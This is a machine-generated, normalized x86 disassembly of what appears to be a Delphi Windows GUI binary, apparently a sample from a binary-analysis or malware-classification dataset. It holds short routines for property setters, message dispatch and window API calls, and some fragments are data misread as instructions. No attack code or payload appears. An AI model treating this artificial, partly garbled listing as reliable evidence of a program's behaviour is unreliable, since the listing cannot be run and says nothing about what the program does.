mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_43ab48
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_43ab94
retn
sub_43ad4c
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403320
pop esi
retn
sub_43ad60
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403320
pop esi
retn
sub_43ad74
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_43ad80
mov eax 0x4
retn
sub_43ad88
retn
sub_43b979
jmp sub_4035c4
sub_43bc66
jmp sub_403878
sub_43bcd8
jmp sub_403878
sub_43bce4
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_43ba0c
sub_43be63
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_41ec8c
retn
sub_43be79
jmp sub_403878
sub_43bea0
jmp sub_403878
sub_43bf22
jmp sub_403878
sub_43bf4a
jmp sub_403878
sub_43bf51
mov esp ebp
pop ebp
retn
sub_43c009
jmp sub_403878
sub_43c060
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43c02c
mov [ ebx + 0x58 ] esi
sub_43c1b4
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_43c1c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032d4
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_43c2b1
jmp sub_403878
sub_43c2b8
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c33b
jmp sub_403878
sub_43c342
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_43c710
xor eax eax
retn
sub_43c718
xor eax eax
retn
sub_43c71c
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_43c724
mov eax [ eax + 0x30 ]
retn
sub_43c7c8
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_43c874
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_43c88c
mov [ eax + 0x5d ] dl
retn
sub_43c890
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_440464
sub_43c8a0
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_43cd83
jmp sub_403878
sub_43cd8a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43cdec
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_43ce70
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_43cf8d
jmp sub_403878
sub_43cf94
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43d090
push eax
xor ecx ecx
mov edx 0xb037
call sub_43e62c
retn
sub_43d251
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403320
sub_43d302
jmp sub_403878
sub_43d309
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43d3e0
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_43e62c
sub_43d3f8
push 0x0
xor ecx ecx
mov edx 0xe
call sub_43e62c
retn
sub_43d408
push edx
mov edx 0xd
call sub_43e62c
retn
sub_43d414
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_43d428
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_43d509
jmp sub_403878
sub_43d510
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43d518
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_43e62c
sub_43d588
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_43d59c
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_43d5a8
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_43d5b0
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_43e62c
sub_43d5d4
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_43e62c
sub_43d5f8
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_43e62c
sub_43d640
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_43d648
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_43e62c
sub_43d66c
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_43e62c
sub_43d690
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_43e62c
sub_43d6ac
push ebx
mov ebx eax
call sub_43a62c
cmp ebx eax
sete al
pop ebx
retn
sub_43d6e4
push esi
mov dl 0x1
mov si 0xffce
call sub_403320
pop esi
retn
sub_43d82e
jmp sub_403878
sub_43d835
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43d958
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_43d8cc
retn
sub_43d9ac
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_43da99
jmp sub_403878
sub_43dab8
xor eax eax
retn
sub_43dabc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43dad4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_43daec
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_43db08
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_43db20
retn
sub_43dbe4
retn
sub_43dbe8
cmp eax [ rw-data ]
sete al
retn
sub_43dc5c
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_43dd78
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403320
pop esi
pop ebp
retn 0x4
sub_43ddb8
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_43e04f
jmp sub_403878
sub_43e056
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e060
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403320
pop esi
retn
sub_43e074
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403320
pop esi
retn
sub_43e343
jmp sub_403878
sub_43e3ec
push esi
mov si 0xffee
call sub_403320
pop esi
retn
sub_43e3f8
mov al 0x1
retn
sub_43e6d0
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_43cad8
retn
sub_43e6f4
retn
sub_43e90d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_417e0c
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_43e928
mov al [ eax + 0x5e ]
xchg edx eax
call sub_41a144
retn
sub_43ea20
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_43f038
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43f040
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43f048
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43f100
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43f120
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_43d5d4
mov [ ebx + 0x9a ] 0x1
sub_43f178
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_43d578
mov [ ebx + 0x56 ] 0x1
sub_43f19c
mov [ edx + 0xc ] 0x1
retn
sub_43f1a4
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_43e62c
sub_43f1bc
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_43e62c
sub_43f1d4
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_43f43a
jmp sub_403878
sub_43f441
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43f46c
mov eax [ r-xdata ]
retn
sub_43f608
jmp sub_403878
sub_43f60f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43f730
mov eax [ eax + 0xb8 ]
retn
sub_43f798
push ebx
mov ebx eax
mov eax ebx
call sub_43dabc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_43f7b4
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_43f94c
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_43f97c
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_43f984
call sub_43c544
retn
sub_43fa84
jmp sub_403878
sub_43fc44
jmp sub_403878
sub_43fc94
jmp sub_403878
sub_43fccc
retn
sub_43ff55
jmp sub_403878
sub_4400dd
jmp sub_403878
sub_44043f
jmp sub_403878
sub_4404eb
jmp sub_403878
sub_4404f8
inc [ eax + 0x160 ]
retn
sub_440500
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_440520
sub_440520
xor edx edx
call sub_440464
retn
sub_4405ed
jmp sub_403878
sub_4405f4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4406e3
jmp sub_403878
sub_440c0a
jmp sub_403878
sub_440c11
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440dd9
jmp sub_403878
sub_440de0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440eb4
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_4410a1
jmp sub_403878
sub_4410a8
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_441198
xor eax eax
retn
sub_441200
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_43e62c
sub_44132e
jmp sub_4035c4
sub_441463
jmp sub_403878
sub_44146a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441474
jmp sub_4035c4
sub_441479
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45d3bc
call sub_40392c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441a34
jmp sub_403878
sub_441a3b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441a44
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_441f42
jmp sub_403878
sub_441f94
push ebx
mov ebx eax
call sub_41d4d4
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_43e62c
pop ebx
retn
sub_441fb0
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_43e62c
retn
sub_441fc4
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_43e62c
retn
sub_441fd4
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_43e62c
retn
sub_442280
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_443f70
pop esi
retn
sub_442394
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4423e4
pop esi
retn
sub_4423a8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4424d0
pop esi
retn
sub_4423bc
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4423d0
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4424c3
jmp sub_403878
sub_4424ca
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44255a
jmp sub_403878
sub_442561
pop ebx
pop ecx
pop ebp
retn
sub_442568
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_442578
retn
sub_44257c
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_44259c
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_4426fc
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_4427cc
retn
sub_4428e4
jmp sub_403878
sub_4428eb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4429b6
jmp sub_403878
sub_4429e0
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_442a72
jmp sub_403878
sub_442c44
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_442ee8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_442fc4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_4409f0
pop esi
retn
sub_443088
push esi
mov si 0xffc1
call sub_403320
pop esi
retn
sub_4430b4
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4430c8
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4430dc
call sub_4409b0
retn
sub_4430e4
call sub_4409b0
retn
sub_4430ec
call sub_4409b0
retn
sub_443194
push ebx
mov ebx eax
mov eax ebx
call sub_43f048
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_41e64c
mov dx 0xb009
mov eax ebx
call sub_4409f0
pop ebx
retn
sub_4432f8
call sub_4409b0
retn
sub_443300
call sub_4409b0
retn
sub_443308
call sub_4409b0
retn
sub_443310
call sub_4409b0
retn
sub_443374
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44380a
jmp sub_403878
sub_443811
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4438f0
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_443a94
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_43e62c
retn
sub_443b34
push ebx
mov ebx eax
mov eax ebx
call sub_443f64
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_443b50
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_443d28
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_443c60
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_443d80
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43e62c
sub_443da0
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_43e62c
sub_443dc4
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_443dd0
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_43e62c
sub_443e7c
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_443e20
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_443f58
jmp sub_403878
sub_443f5f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44417e
jmp sub_403878
sub_444185
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44428c
call sub_43e3fc
retn
sub_4446da
jmp sub_403878
sub_444770
mov eax [ r-xdata ]
retn
sub_4448d7
jmp sub_403878
sub_444c6a
jmp sub_403878
sub_444dac
test [ eax + 0x52 ] 0x4
setne al
retn
sub_444f08
jmp sub_403878
sub_444f0f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41ec8c
retn
sub_444f2b
jmp sub_403878
sub_444f38
retn
sub_44500c
mov [ edx + 0xc ] 0xffffffff
retn
sub_44506a
jmp sub_403878
sub_445071
pop ecx
pop ecx
pop ebp
retn
sub_445111
jmp sub_403878
sub_445118
pop ebx
mov esp ebp
pop ebp
retn
sub_445184
call sub_4411b8
retn
sub_445217
jmp sub_403878
sub_44521e
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_4453fd
jmp sub_403878
sub_445404
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445560
push ebx
mov ebx eax
mov eax ebx
call sub_44a50c
or edx 0xffffffff
mov eax ebx
call sub_44568c
pop ebx
retn
sub_445638
jmp sub_403878
sub_44568c
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_445578
sub_4457fc
push ebx
mov ebx eax
mov eax ebx
call sub_44a5c4
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_445814
push ebx
mov ebx eax
mov eax ebx
call sub_44a5c4
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_445900
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_441df0
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_44599b
jmp sub_403878
sub_4459a2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4459c5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41ec8c
retn
sub_4459be
jmp sub_403878
sub_4459c5
pop ebx
pop ecx
pop ebp
retn
sub_4459cc
retn
sub_445a34
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_445da1
jmp sub_403878
sub_445f88
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_446174
jmp sub_403878
sub_446224
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_446238
inc [ eax + 0x6c ]
retn
sub_44623c
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_447abc
sub_44639c
call sub_446a9c
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_446d47
jmp sub_403878
sub_446d4e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446d6b
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
sub_446d64
jmp sub_403878
sub_446d6b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44704c
jmp sub_403878
sub_447053
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447070
mov eax [ ebp - 0x4 ]
call sub_41ec8c
retn
sub_447069
jmp sub_403878
sub_447070
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44708d
mov eax [ ebp - 0x4 ]
call sub_403124
retn
sub_447086
jmp sub_403878
sub_44708d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447541
jmp sub_403878
sub_447548
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4476d3
jmp sub_403878
sub_4476da
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44778f
jmp sub_403878
sub_447796
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_447884
jmp sub_403878
sub_4478d5
jmp sub_403878
sub_4478dc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447998
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4462a8
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_447ae4
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_445de4
sub_4483e4
jmp sub_403878
sub_4483eb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4484b4
call GetCapture
retn
sub_4484bc
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40cd00
pop ebx
retn
sub_4484cc
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_448732
jmp sub_403878
sub_44892c
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_448b40
jmp sub_403878
sub_448b47
pop ebx
mov esp ebp
pop ebp
retn
sub_448bf3
jmp sub_403878
sub_448bfa
pop ebp
retn
sub_448c82
jmp sub_403878
sub_448c89
pop ebp
retn
sub_448d36
out dx eax
push edx
push ecx
jmp esp
sub_4493d8
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_414164
retn
sub_4493f0
mov al 0x1
retn
sub_4493f4
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_41aeac
retn
mov eax edx
retn
sub_449404
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_41ae7c
retn
mov al 0x1
retn
sub_4496f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_414108
pop esi
pop ebx
retn
sub_449708
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_449744
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_4499a8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b0
pop ebx
retn
sub_4499bc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b0
pop ebx
retn
sub_4499d0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b0
pop ebx
retn
sub_4499e4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b0
pop ebx
retn
sub_4499f8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b0
pop ebx
retn
sub_449a0c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b0
pop ebx
retn
sub_449a20
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b0
pop ebx
retn
sub_449a34
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b0
pop ebx
retn
sub_449a48
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b0
pop ebx
retn
sub_449a5c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b0
pop ebx
retn
sub_449a70
retn
sub_449a74
retn
sub_449a78
retn
sub_449a7c
retn
sub_449a80
retn
sub_449a84
retn
sub_449a88
retn
sub_449a8c
retn
sub_449a90
retn
sub_449a94
retn
sub_449a98
retn
sub_449a9c
retn
sub_449d48
jmp sub_403878
sub_44a0e4
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0x90 ] eax
sub_44a10c
push esi
mov si 0xffef
call sub_403320
pop esi
retn
sub_44a1ad
jmp sub_403878
sub_44a1b4
pop ebp
retn
sub_44a1b8
sub [ rw-data ] 0x1
jae r-xdata
retn
